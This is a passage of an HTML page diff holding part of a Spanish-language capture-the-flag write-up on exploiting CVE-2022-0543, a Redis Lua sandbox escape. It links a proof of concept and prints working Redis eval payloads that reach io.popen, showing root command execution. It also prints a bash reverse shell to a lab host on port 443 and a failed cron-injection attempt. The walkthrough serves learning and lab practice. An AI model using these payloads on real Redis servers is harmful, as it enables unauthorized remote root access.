+                <p>Una prueba de concepto está disponible en: <a href="https://github.com/0x7eTeam/CVE-2022-0543/blob/main/CVE-2022-0543.py">CVE-2022-0543.py</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad permite cargar objetos compartidos arbitrarios (archivos `.so`) mediante la función <code>package.loadlib</code> de Lua, que normalmente está en sandbox pero puede evitarse. Cargando <code>liblua5.1.so.0</code>, puedo acceder a la función <code>io.popen</code> para ejecutar comandos del sistema.</p>
+
+                <p>Primero, pruebo la ejecución de comandos:</p>
+                <pre><code class="language-redis">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0</code></pre>
+                <pre><code class="language-plaintext">"uid=0(root) gid=0(root) groups=0(root)\n"</code></pre>
+
+                <p>¡Excelente! Los comandos se ejecutan como root. Ahora envío una reverse shell:</p>
+                <pre><code class="language-redis">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -c \"bash -i >& /dev/tcp/10.10.16.2/443 0>&1\"", "r"); local res = f:read("*a"); f:close(); return res' 0</code></pre>
+
+                <p>En mi listener de netcat, recibo una shell de root, permitiéndome recuperar la flag de root y completar la máquina.</p>
+
+                <h3>Entendiendo los Problemas del Formato de Archivo de Redis</h3>
+                <p>Como nota al margen, Redis guarda archivos en un formato binario con metadatos, lo que explica por qué mis intentos anteriores de cron job fallaron:</p>
+                <pre><code class="language-plaintext">REDIS0009� redis-ver6.0.15�
+�edis-bits�@�ctime��Siused-mem�@O
+aof-preamble���x6
+* * * * * /bin/bash -c 'echo test > /tmp/crontest'</code></pre>
+
+                <p>El encabezado binario corrompe la sintaxis del cron, evitando su ejecución. Por esto el método de explotación basado en Lua fue necesario para conseguir acceso root.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
